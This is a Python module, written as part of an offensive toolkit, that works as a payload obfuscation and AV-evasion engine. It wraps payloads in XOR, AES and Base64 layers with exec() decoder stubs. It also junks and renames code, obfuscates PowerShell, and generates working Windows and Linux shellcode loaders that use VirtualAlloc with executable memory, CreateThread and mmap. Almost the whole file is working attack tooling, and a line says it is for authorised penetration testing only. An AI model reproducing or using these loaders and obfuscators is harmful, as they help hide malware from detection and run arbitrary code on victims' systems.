#!/usr/bin/env python3
"""
Payload 混淆模块 - Payload Obfuscation Engine
功能: XOR/AES加密、变量混淆、字符串编码、代码变形
仅用于授权渗透测试
"""

import ast
import base64
import hashlib
import os
import random
import re
import secrets
import string
import zlib
from abc import ABC, abstractmethod
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, List, Tuple

# 尝试导入加密库
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

import logging

logger = logging.getLogger(__name__)


class EncodingType(Enum):
    """编码类型"""

    BASE64 = "base64"
    BASE32 = "base32"
    HEX = "hex"
    XOR = "xor"
    AES = "aes"
    ROT13 = "rot13"
    URL = "url"
    UNICODE = "unicode"


class ObfuscationType(Enum):
    """混淆类型"""

    VARIABLE_RENAME = "var_rename"
    STRING_ENCODE = "string_encode"
    CODE_FLOW = "code_flow"
    DEAD_CODE = "dead_code"
    JUNK_CODE = "junk_code"
    COMPRESS = "compress"


@dataclass
class ObfuscationConfig:
    """混淆配置"""

    encoding: EncodingType = EncodingType.XOR
    xor_key: str = ""
    aes_key: str = ""
    variable_prefix: str = "_"
    add_junk_code: bool = True
    junk_ratio: float = 0.3
    compress: bool = False
    multi_layer: int = 1  # 多层编码


@dataclass
class ObfuscationResult:
    """混淆结果"""

    success: bool
    original_size: int
    obfuscated_size: int
    payload: str
    decoder: str = ""
    key: str = ""
    encoding: str = ""
    layers: int = 1


class BaseEncoder(ABC):
    """编码器基类"""

    @abstractmethod
    def encode(self, data: bytes) -> bytes:
        pass

    @abstractmethod
    def decode(self, data: bytes) -> bytes:
        pass

    @abstractmethod
    def get_decoder_code(self, var_name: str = "data") -> str:
        """生成解码器代码"""


class XOREncoder(BaseEncoder):
    """XOR 编码器"""

    def __init__(self, key: str = ""):
        self.key = key or self._generate_key()

    def _generate_key(self, length: int = 16) -> str:
        """生成密码学安全的随机密钥"""
        charset = string.ascii_letters + string.digits
        return "".join(secrets.choice(charset) for _ in range(length))

    def encode(self, data: bytes) -> bytes:
        key_bytes = self.key.encode()
        return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

    def decode(self, data: bytes) -> bytes:
        return self.encode(data)  # XOR is symmetric

    def get_decoder_code(self, var_name: str = "data") -> str:
        return f"""
def _xd({var_name}, k):
    kb = k.encode()
    return bytes([b ^ kb[i % len(kb)] for i, b in enumerate({var_name})])
"""


class AESEncoder(BaseEncoder):
    """AES 编码器"""

    def __init__(self, key: str = ""):
        if not HAS_CRYPTO:
            raise ImportError("pycryptodome required for AES")
        self.key = key or self._generate_key()
        self._key_bytes = hashlib.sha256(self.key.encode()).digest()

    def _generate_key(self, length: int = 32) -> str:
        """生成密码学安全的随机密钥"""
        charset = string.ascii_letters + string.digits
        return "".join(secrets.choice(charset) for _ in range(length))

    def encode(self, data: bytes) -> bytes:
        iv = os.urandom(16)
        cipher = AES.new(self._key_bytes, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data, AES.block_size))
        return iv + encrypted

    def decode(self, data: bytes) -> bytes:
        iv = data[:16]
        encrypted = data[16:]
        cipher = AES.new(self._key_bytes, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(encrypted), AES.block_size)

    def get_decoder_code(self, var_name: str = "data") -> str:
        return f"""
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

def _ad({var_name}, k):
    kb = hashlib.sha256(k.encode()).digest()
    iv, enc = {var_name}[:16], {var_name}[16:]
    c = AES.new(kb, AES.MODE_CBC, iv)
    return unpad(c.decrypt(enc), 16)
"""


class Base64Encoder(BaseEncoder):
    """Base64 编码器"""

    def encode(self, data: bytes) -> bytes:
        return base64.b64encode(data)

    def decode(self, data: bytes) -> bytes:
        return base64.b64decode(data)

    def get_decoder_code(self, var_name: str = "data") -> str:
        return f"import base64; {var_name} = base64.b64decode({var_name})"


class Base32Encoder(BaseEncoder):
    """Base32 编码器"""

    def encode(self, data: bytes) -> bytes:
        return base64.b32encode(data)

    def decode(self, data: bytes) -> bytes:
        return base64.b32decode(data)

    def get_decoder_code(self, var_name: str = "data") -> str:
        return f"import base64; {var_name} = base64.b32decode({var_name})"


class HexEncoder(BaseEncoder):
    """Hex 编码器"""

    def encode(self, data: bytes) -> bytes:
        return data.hex().encode()

    def decode(self, data: bytes) -> bytes:
        return bytes.fromhex(data.decode())

    def get_decoder_code(self, var_name: str = "data") -> str:
        return f"{var_name} = bytes.fromhex({var_name}.decode())"


class ROT13Encoder(BaseEncoder):
    """ROT13 编码器 (仅适用于 ASCII 字母)"""

    def _rot13(self, data: bytes) -> bytes:
        result = []
        for b in data:
            if 65 <= b <= 90:  # A-Z
                result.append(((b - 65 + 13) % 26) + 65)
            elif 97 <= b <= 122:  # a-z
                result.append(((b - 97 + 13) % 26) + 97)
            else:
                result.append(b)
        return bytes(result)

    def encode(self, data: bytes) -> bytes:
        return self._rot13(data)

    def decode(self, data: bytes) -> bytes:
        return self._rot13(data)

    def get_decoder_code(self, var_name: str = "data") -> str:
        return f"""
def _r13(d):
    r = []
    for b in d:
        if 65 <= b <= 90:
            r.append(((b - 65 + 13) % 26) + 65)
        elif 97 <= b <= 122:
            r.append(((b - 97 + 13) % 26) + 97)
        else:
            r.append(b)
    return bytes(r)
{var_name} = _r13({var_name})
"""


class UnicodeEncoder(BaseEncoder):
    """Unicode 编码器"""

    def encode(self, data: bytes) -> bytes:
        return "".join([f"\\u{b:04x}" for b in data]).encode()

    def decode(self, data: bytes) -> bytes:
        text = data.decode()
        result = []
        i = 0
        while i < len(text):
            if text[i : i + 2] == "\\u" and i + 6 <= len(text):
                result.append(int(text[i + 2 : i + 6], 16))
                i += 6
            else:
                result.append(ord(text[i]))
                i += 1
        return bytes(result)

    def get_decoder_code(self, var_name: str = "data") -> str:
        return f"""
def _ud(d):
    t, r, i = d.decode(), [], 0
    while i < len(t):
        if t[i:i+2] == "\\\\u" and i + 6 <= len(t):
            r.append(int(t[i+2:i+6], 16)); i += 6
        else:
            r.append(ord(t[i])); i += 1
    return bytes(r)
{var_name} = _ud({var_name})
"""


class PayloadObfuscator:
    """
    Payload 混淆引擎

    Usage:
        obfuscator = PayloadObfuscator()

        # 简单 XOR 混淆
        result = obfuscator.obfuscate(
            payload='print("Hello World")',
            encoding=EncodingType.XOR
        )

        # 多层 AES + Base64 混淆
        result = obfuscator.obfuscate_multilayer(
            payload='os.system("whoami")',
            encodings=[EncodingType.AES, EncodingType.BASE64]
        )
    """

    def __init__(self):
        self._encoders: Dict[EncodingType, type] = {
            EncodingType.XOR: XOREncoder,
            EncodingType.BASE64: Base64Encoder,
            EncodingType.BASE32: Base32Encoder,
            EncodingType.HEX: HexEncoder,
            EncodingType.ROT13: ROT13Encoder,
            EncodingType.UNICODE: UnicodeEncoder,
        }

        if HAS_CRYPTO:
            self._encoders[EncodingType.AES] = AESEncoder

        self._var_counter = 0

    def _get_encoder(self, encoding: EncodingType, key: str = "") -> BaseEncoder:
        """获取编码器实例"""
        encoder_class = self._encoders.get(encoding)
        if not encoder_class:
            raise ValueError(f"Unsupported encoding: {encoding}")

        if encoding in [EncodingType.XOR, EncodingType.AES]:
            return encoder_class(key)
        return encoder_class()

    def _generate_var_name(self) -> str:
        """生成随机变量名"""
        self._var_counter += 1
        prefix = secrets.choice(["_", "__", "___"])
        chars = "".join(secrets.choice(string.ascii_lowercase) for _ in range(4))
        return f"{prefix}{chars}{self._var_counter}"

    def obfuscate(
        self,
        payload: str,
        encoding: EncodingType = EncodingType.XOR,
        key: str = "",
        add_decoder: bool = True,
    ) -> ObfuscationResult:
        """
        混淆 Payload

        Args:
            payload: 原始 Payload
            encoding: 编码类型
            key: 加密密钥 (XOR/AES)
            add_decoder: 是否添加解码器
        """
        try:
            encoder = self._get_encoder(encoding, key)
            payload_bytes = payload.encode("utf-8")

            # 编码
            encoded = encoder.encode(payload_bytes)

            # 生成解码器
            decoder_code = ""
            if add_decoder:
                var_name = self._generate_var_name()

                if encoding == EncodingType.XOR:
                    encoded_b64 = base64.b64encode(encoded).decode()
                    decoder_code = f"""
import base64
{var_name} = base64.b64decode("{encoded_b64}")
{encoder.get_decoder_code(var_name)}
{var_name} = _xd({var_name}, "{encoder.key}")
exec({var_name}.decode())
"""
                elif encoding == EncodingType.AES:
                    encoded_b64 = base64.b64encode(encoded).decode()
                    decoder_code = f"""
import base64
{var_name} = base64.b64decode("{encoded_b64}")
{encoder.get_decoder_code(var_name)}
{var_name} = _ad({var_name}, "{encoder.key}")
exec({var_name}.decode())
"""
                elif encoding == EncodingType.BASE64:
                    decoder_code = f"""
import base64
{var_name} = base64.b64decode("{encoded.decode()}")
exec({var_name}.decode())
"""
                else:
                    # 通用模式
                    encoded_repr = repr(encoded)
                    decoder_code = f"""
{var_name} = {encoded_repr}
{encoder.get_decoder_code(var_name)}
exec({var_name}.decode())
"""

            return ObfuscationResult(
                success=True,
                original_size=len(payload),
                obfuscated_size=len(decoder_code) if decoder_code else len(encoded),
                payload=decoder_code if decoder_code else encoded.decode(errors="ignore"),
                decoder=decoder_code,
                key=getattr(encoder, "key", ""),
                encoding=encoding.value,
            )

        except Exception as e:
            return ObfuscationResult(
                success=False, original_size=len(payload), obfuscated_size=0, payload=f"Error: {e}"
            )

    def obfuscate_multilayer(
        self,
        payload: str,
        encodings: List[EncodingType] = None,
        keys: Dict[EncodingType, str] = None,
    ) -> ObfuscationResult:
        """
        多层混淆

        Args:
            payload: 原始 Payload
            encodings: 编码层列表 (按顺序应用)
            keys: 各层密钥
        """
        encodings = encodings or [EncodingType.XOR, EncodingType.BASE64]
        keys = keys or {}

        try:
            current_data = payload.encode("utf-8")
            encoder_instances = []

            # 依次应用各层编码
            for encoding in encodings:
                key = keys.get(encoding, "")
                encoder = self._get_encoder(encoding, key)
                encoder_instances.append((encoding, encoder))
                current_data = encoder.encode(current_data)

            # 生成多层解码器
            var_name = self._generate_var_name()
            encoded_b64 = base64.b64encode(current_data).decode()

            decoder_parts = ["import base64", f'{var_name} = base64.b64decode("{encoded_b64}")']

            # 逆序添加解码步骤
            for encoding, encoder in reversed(encoder_instances):
                if encoding == EncodingType.XOR:
                    decoder_parts.append(encoder.get_decoder_code(var_name))
                    decoder_parts.append(f'{var_name} = _xd({var_name}, "{encoder.key}")')
                elif encoding == EncodingType.AES:
                    decoder_parts.append(encoder.get_decoder_code(var_name))
                    decoder_parts.append(f'{var_name} = _ad({var_name}, "{encoder.key}")')
                elif encoding == EncodingType.BASE64:
                    decoder_parts.append(
                        f"import base64; {var_name} = base64.b64decode({var_name})"
                    )
                elif encoding == EncodingType.BASE32:
                    decoder_parts.append(
                        f"import base64; {var_name} = base64.b32decode({var_name})"
                    )
                elif encoding == EncodingType.HEX:
                    decoder_parts.append(f"{var_name} = bytes.fromhex({var_name}.decode())")

            decoder_parts.append(f"exec({var_name}.decode())")
            decoder_code = "\n".join(decoder_parts)

            return ObfuscationResult(
                success=True,
                original_size=len(payload),
                obfuscated_size=len(decoder_code),
                payload=decoder_code,
                decoder=decoder_code,
                encoding=",".join([e.value for e in encodings]),
                layers=len(encodings),
            )

        except Exception as e:
            return ObfuscationResult(
                success=False,
                original_size=len(payload),
                obfuscated_size=0,
                payload=f"Error: {e}",
                layers=0,
            )


class VariableObfuscator:
    """变量名混淆器"""

    def __init__(self, prefix: str = "_"):
        self.prefix = prefix
        self._mapping: Dict[str, str] = {}
        self._counter = 0

    def _generate_name(self) -> str:
        """生成混淆变量名"""
        self._counter += 1
        name_len = secrets.randbelow(5) + 4  # 4-8
        chars = "".join(secrets.choice(string.ascii_lowercase) for _ in range(name_len))
        return f"{self.prefix}{chars}{self._counter}"

    def obfuscate_code(self, code: str) -> Tuple[str, Dict[str, str]]:
        """
        混淆 Python 代码中的变量名

        Returns:
            (混淆后代码, 变量映射表)
        """
        try:
            tree = ast.parse(code)
        except SyntaxError:
            return code, {}

        # 收集所有用户定义的变量名
        user_vars = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Store):
                user_vars.add(node.id)
            elif isinstance(node, ast.FunctionDef):
                user_vars.add(node.name)
                for arg in node.args.args:
                    user_vars.add(arg.arg)

        # 排除内置名称
        builtins = (
            set(dir(__builtins__)) if isinstance(__builtins__, dict) else set(dir(__builtins__))
        )
        builtins.update(["print", "exec", "eval", "open", "import", "from", "as"])
        user_vars -= builtins

        # 创建映射
        for var in user_vars:
            if var not in self._mapping:
                self._mapping[var] = self._generate_name()

        # 替换变量名
        result = code
        for original, obfuscated in sorted(
            self._mapping.items(), key=lambda x: -len(x[0])  # 先替换长名称
        ):
            # 使用词边界替换
            result = re.sub(rf"\b{re.escape(original)}\b", obfuscated, result)

        return result, self._mapping.copy()


class CodeTransformer:
    """代码变形器"""

    @staticmethod
    def add_junk_code(code: str, ratio: float = 0.3) -> str:
        """
        添加垃圾代码

        Args:
            code: 原始代码
            ratio: 垃圾代码比例
        """
        junk_templates = [
            "__{var}__ = {val}",
            "if False: {var} = {val}",
            "_ = lambda: {val}",
            "try: pass\nexcept: {var} = {val}",
            "[{val} for _ in []]",
        ]

        lines = code.split("\n")
        result_lines = []

        for line in lines:
            result_lines.append(line)

            # 按比例插入垃圾代码
            if secrets.randbelow(100) < int(ratio * 100) and line.strip():
                var = "".join(secrets.choice(string.ascii_lowercase) for _ in range(4))
                val = secrets.randbelow(10000)
                template = secrets.choice(junk_templates)
                junk = template.format(var=var, val=val)
                result_lines.append(junk)

        return "\n".join(result_lines)

    @staticmethod
    def string_to_chr_concat(s: str) -> str:
        """将字符串转为 chr() 拼接"""
        return "+".join([f"chr({ord(c)})" for c in s])

    @staticmethod
    def string_to_hex_decode(s: str) -> str:
        """将字符串转为十六进制解码"""
        hex_str = s.encode().hex()
        return f'bytes.fromhex("{hex_str}").decode()'

    @staticmethod
    def obfuscate_strings(code: str) -> str:
        """混淆代码中的字符串"""
        # 匹配字符串字面量
        string_pattern = r'(["\'])(.+?)\1'

        def replace_string(match):
            quote = match.group(1)
            content = match.group(2)

            # 短字符串用 chr() 拼接
            if len(content) < 20:
                return f"({CodeTransformer.string_to_chr_concat(content)})"
            else:
                # 长字符串用 hex 解码
                return CodeTransformer.string_to_hex_decode(content)

        return re.sub(string_pattern, replace_string, code)

    @staticmethod
    def compress_code(code: str) -> str:
        """压缩并编码代码"""
        compressed = zlib.compress(code.encode())
        b64 = base64.b64encode(compressed).decode()
        return f"""
import zlib,base64
exec(zlib.decompress(base64.b64decode("{b64}")))
"""


class ShellcodeObfuscator:
    """Shellcode 混淆器"""

    @staticmethod
    def xor_shellcode(shellcode: bytes, key: bytes = None) -> Tuple[bytes, bytes]:
        """XOR 混淆 Shellcode"""
        if key is None:
            key = os.urandom(len(shellcode) if len(shellcode) < 32 else 32)

        obfuscated = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

        return obfuscated, key

    @staticmethod
    def add_nop_sled(shellcode: bytes, length: int = 16) -> bytes:
        """添加 NOP Sled"""
        nop = b"\x90" * length
        return nop + shellcode

    @staticmethod
    def insert_garbage(shellcode: bytes, ratio: float = 0.2) -> bytes:
        """
        插入垃圾指令
        注: 需要确保垃圾指令不影响执行流
        """
        garbage_opcodes = [
            b"\x90",  # NOP
            b"\x50\x58",  # PUSH EAX; POP EAX
            b"\x53\x5b",  # PUSH EBX; POP EBX
            b"\x89\xc0",  # MOV EAX, EAX
            b"\x31\xc9\x31\xc9",  # XOR ECX,ECX twice
        ]

        result = bytearray()
        for byte in shellcode:
            result.append(byte)
            if random.random() < ratio:
                result.extend(random.choice(garbage_opcodes))

        return bytes(result)

    @staticmethod
    def to_python_loader(shellcode: bytes, xor_key: bytes = None) -> str:
        """生成 Python Shellcode 加载器"""
        if xor_key:
            shellcode, _ = ShellcodeObfuscator.xor_shellcode(shellcode, xor_key)
            key_b64 = base64.b64encode(xor_key).decode()
            sc_b64 = base64.b64encode(shellcode).decode()

            return f"""
import ctypes, base64

k = base64.b64decode("{key_b64}")
sc = base64.b64decode("{sc_b64}")
sc = bytes([sc[i] ^ k[i % len(k)] for i in range(len(sc))])

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), ctypes.c_int(len(sc)),
    ctypes.c_int(0x3000), ctypes.c_int(0x40)
)
buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr), buf, ctypes.c_int(len(sc))
)
ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0),
    ctypes.c_int(ptr), ctypes.c_int(0),
    ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
"""
        else:
            sc_b64 = base64.b64encode(shellcode).decode()
            return f"""
import ctypes, base64

sc = base64.b64decode("{sc_b64}")
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), ctypes.c_int(len(sc)),
    ctypes.c_int(0x3000), ctypes.c_int(0x40)
)
buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr), buf, ctypes.c_int(len(sc))
)
ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0),
    ctypes.c_int(ptr), ctypes.c_int(0),
    ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
"""


class PowerShellObfuscator:
    """PowerShell 混淆器"""

    @staticmethod
    def base64_encode(script: str) -> str:
        """Base64 编码 PowerShell 脚本"""
        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        return f"powershell -EncodedCommand {encoded}"

    @staticmethod
    def string_concat(s: str) -> str:
        """字符串拼接混淆"""
        if len(s) < 3:
            return f"'{s}'"

        parts = []
        i = 0
        while i < len(s):
            chunk_len = random.randint(1, 3)
            parts.append(f"'{s[i:i+chunk_len]}'")
            i += chunk_len

        return "(" + "+".join(parts) + ")"

    @staticmethod
    def tick_obfuscation(s: str) -> str:
        """反引号混淆"""
        result = []
        for c in s:
            if c.isalpha() and random.random() < 0.5:
                result.append(f"`{c}")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def variable_rename(script: str) -> str:
        """变量名混淆"""
        # 简化实现：替换常见变量
        replacements = {
            "$_": f"${secrets.choice(string.ascii_lowercase)}",
            "$args": f"${secrets.choice(string.ascii_lowercase)}rgs",
        }

        for old, new in replacements.items():
            script = script.replace(old, new)

        return script


# 便捷函数
def obfuscate_payload(
    payload: str, encoding: str = "xor", key: str = "", multilayer: bool = False
) -> Dict[str, Any]:
    """
    混淆 Payload

    Args:
        payload: 原始 Payload
        encoding: 编码类型 (xor, aes, base64, base32, hex, rot13)
        key: 加密密钥
        multilayer: 是否多层混淆

    Returns:
        {success, payload, decoder, key, encoding, layers}
    """
    obfuscator = PayloadObfuscator()

    encoding_map = {
        "xor": EncodingType.XOR,
        "aes": EncodingType.AES,
        "base64": EncodingType.BASE64,
        "base32": EncodingType.BASE32,
        "hex": EncodingType.HEX,
        "rot13": EncodingType.ROT13,
        "unicode": EncodingType.UNICODE,
    }

    enc_type = encoding_map.get(encoding.lower(), EncodingType.XOR)

    if multilayer:
        result = obfuscator.obfuscate_multilayer(payload, encodings=[enc_type, EncodingType.BASE64])
    else:
        result = obfuscator.obfuscate(payload, enc_type, key)

    return {
        "success": result.success,
        "payload": result.payload,
        "decoder": result.decoder,
        "key": result.key,
        "encoding": result.encoding,
        "original_size": result.original_size,
        "obfuscated_size": result.obfuscated_size,
        "layers": result.layers,
    }


def obfuscate_python_code(
    code: str,
    rename_vars: bool = True,
    add_junk: bool = True,
    obfuscate_strings: bool = True,
    compress: bool = False,
) -> Dict[str, Any]:
    """
    混淆 Python 代码

    Args:
        code: 原始代码
        rename_vars: 是否重命名变量
        add_junk: 是否添加垃圾代码
        obfuscate_strings: 是否混淆字符串
        compress: 是否压缩

    Returns:
        {success, code, mapping}
    """
    try:
        result_code = code
        var_mapping = {}

        if rename_vars:
            var_obfuscator = VariableObfuscator()
            result_code, var_mapping = var_obfuscator.obfuscate_code(result_code)

        if obfuscate_strings:
            result_code = CodeTransformer.obfuscate_strings(result_code)

        if add_junk:
            result_code = CodeTransformer.add_junk_code(result_code)

        if compress:
            result_code = CodeTransformer.compress_code(result_code)

        return {
            "success": True,
            "code": result_code,
            "mapping": var_mapping,
            "original_size": len(code),
            "obfuscated_size": len(result_code),
        }

    except Exception as e:
        return {"success": False, "code": code, "error": str(e)}


def generate_shellcode_loader(
    shellcode_hex: str, xor_encrypt: bool = True, platform: str = "windows"
) -> Dict[str, Any]:
    """
    生成 Shellcode 加载器

    Args:
        shellcode_hex: 十六进制 Shellcode
        xor_encrypt: 是否 XOR 加密
        platform: 目标平台 (windows/linux)

    Returns:
        {success, loader, key}
    """
    try:
        shellcode = bytes.fromhex(shellcode_hex.replace("\\x", "").replace(" ", ""))

        key = None
        if xor_encrypt:
            key = os.urandom(16)

        if platform.lower() == "windows":
            loader = ShellcodeObfuscator.to_python_loader(shellcode, key)
        else:
            # Linux 加载器
            loader = f"""
import ctypes, base64, mmap

sc = base64.b64decode("{base64.b64encode(shellcode).decode()}")
mem = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(sc)
ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mem)))()
"""

        return {
            "success": True,
            "loader": loader,
            "key": key.hex() if key else None,
            "platform": platform,
        }

    except Exception as e:
        return {"success": False, "loader": "", "error": str(e)}


if __name__ == "__main__":
    # 配置测试用日志
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

    logger.info("Payload Obfuscation Module")
    logger.info("=" * 50)
    logger.info(f"AES available: {HAS_CRYPTO}")
    logger.info("Usage:")
    logger.info("  from core.evasion import obfuscate_payload, obfuscate_python_code")
    logger.info("  result = obfuscate_payload('print(\"hello\")', encoding='xor')")
    logger.info("Supported encodings:")
    for enc in EncodingType:
        logger.info(f"  - {enc.value}")
